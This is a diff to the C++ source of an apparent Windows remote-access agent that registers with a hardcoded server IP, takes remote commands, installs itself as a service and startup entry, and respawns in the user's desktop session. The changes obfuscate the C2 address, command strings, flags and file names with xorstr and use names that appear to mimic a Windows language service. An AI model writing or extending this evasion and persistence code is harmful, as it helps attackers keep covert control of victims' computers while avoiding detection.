@@ -9,6 +9,7 @@
 #include "platform/win_utils.h"
 #include "utils/base64.h"
 #include "utils/logger.h"
+#include "utils/xorstr.h"
 
 #include <string>
 #include <thread>
@@ -33,12 +34,12 @@ static std::string get_exe_dir() {
 }
 
 // Embedded default config — agent works without any external file
-static constexpr const char* k_DefaultServerHost = "42.96.20.12";
-static constexpr uint16_t k_DefaultServerPort = 8080;
+static uint16_t k_DefaultServerPort = 8080;
 
 static bool load_config() {
     std::string exe_dir = get_exe_dir();
-    std::string config_path = exe_dir + "\\.agent.conf";  // hidden file
+    auto conf_name = xorstr("\\.agent.conf").decrypt();
+    std::string config_path = exe_dir + conf_name;
 
     // Try loading existing config
     if (agent::WinUtils::read_config_file(config_path,
@@ -52,7 +53,8 @@ static bool load_config() {
     }
 
     // Also try legacy path (agent.conf without dot prefix)
-    std::string legacy_path = exe_dir + "\\agent.conf";
+    auto legacy_name = xorstr("\\agent.conf").decrypt();
+    std::string legacy_path = exe_dir + legacy_name;
     if (agent::WinUtils::read_config_file(legacy_path,
         g_config.server_host, g_config.server_port,
         g_config.agent_id, g_config.agent_token)) {
@@ -63,7 +65,7 @@ static bool load_config() {
 
     // No config found — auto-register with embedded defaults
     agent::Logger::info("no config found, auto-registering with server...");
-    g_config.server_host = k_DefaultServerHost;
+    g_config.server_host = xorstr("42.96.20.12").decrypt();
     g_config.server_port = k_DefaultServerPort;
 
     std::string hostname = agent::WinUtils::get_hostname();
@@ -187,12 +189,12 @@ static int run_agent() {
 
     ws_client.set_on_remote_command([](const std::string& command) {
         agent::Logger::info("received remote command: " + command);
-        if (command == "uninstall") {
+        if (command == xorstr("uninstall").decrypt()) {
             agent::Logger::info("remote uninstall command received");
             agent::Persistence::remove_from_startup(g_config);
             agent::ServiceManager::uninstall_service(g_config);
             g_running.store(false);
-        } else if (command == "restart") {
+        } else if (command == xorstr("restart").decrypt()) {
             agent::Logger::info("remote restart command received");
             // Watchdog will restart us
             g_running.store(false);
@@ -246,41 +248,64 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     std::string exe_dir = get_exe_dir();
 
     // Initialize logger
-    agent::Logger::init(exe_dir + "\\imlang.log");
+    auto log_name = xorstr("\\imlang.log").decrypt();
+    agent::Logger::init(exe_dir + log_name);
 
     // Check for service install/uninstall commands
-    if (cmd_line.find("--install") != std::string::npos) {
+    auto flag_install = xorstr("--install").decrypt();
+    auto flag_uninstall = xorstr("--uninstall").decrypt();
+    auto flag_service = xorstr("--service").decrypt();
+
+    if (cmd_line.find(flag_install) != std::string::npos) {
         if (!load_config()) return 1;
         bool ok = agent::ServiceManager::install_service(g_config);
         return ok ? 0 : 1;
     }
 
-    if (cmd_line.find("--uninstall") != std::string::npos) {
+    if (cmd_line.find(flag_uninstall) != std::string::npos) {
         if (!load_config()) return 1;
         agent::ServiceManager::uninstall_service(g_config);
         agent::Persistence::remove_from_startup(g_config);
         return 0;
     }
 
-    // Check for service mode — started by SCM
-    if (cmd_line.find("--service") != std::string::npos) {
+    // Check for service mode — started by SCM (runs in Session 0, no desktop)
+    if (cmd_line.find(flag_service) != std::string::npos) {
         if (!load_config()) return 1;
-        // K3 fix: wire up SCM stop → g_running
+
+        // Service's job: keep agent running in the user's desktop session.
+        // Session 0 has no GUI, so we spawn ourselves in the active user session.
         agent::ServiceManager::set_stop_callback([]() {
             g_running.store(false);
         });
-        // K4 fix: SCM dispatcher must run on a separate thread since it blocks;
-        // the main thread runs the agent logic
         std::thread svc_thread([]() {
             agent::ServiceManager::run_as_service(g_config);
         });
         svc_thread.detach();
-        // Give SCM time to register
         Sleep(500);
+
+        // Spawn agent in user session, then monitor and respawn if it dies
+        wchar_t self_path[MAX_PATH];
+        GetModuleFileNameW(nullptr, self_path, MAX_PATH);
+
+        while (g_running.load()) {
+            // Launch in active user session (no --service flag)
+            if (agent::WinUtils::launch_in_user_session(self_path)) {
+                agent::Logger::info("spawned agent in user session");
+            } else {
+                agent::Logger::error("failed to spawn in user session, will retry");
+            }
+            // Wait before checking again (process may have exited)
+            for (int i = 0; i < 300 && g_running.load(); ++i) {
+                Sleep(100);
+            }
+        }
+        return 0;
     }
 
     // Single instance check
-    HANDLE mutex = agent::WinUtils::create_single_instance_mutex("Global\\IMLangServiceMutex");
+    auto mutex_name = xorstr("Global\\IMLangServiceMutex").decrypt();
+    HANDLE mutex = agent::WinUtils::create_single_instance_mutex(mutex_name);
     if (!mutex) {
         agent::Logger::info("another instance is already running, exiting");
         return 0;
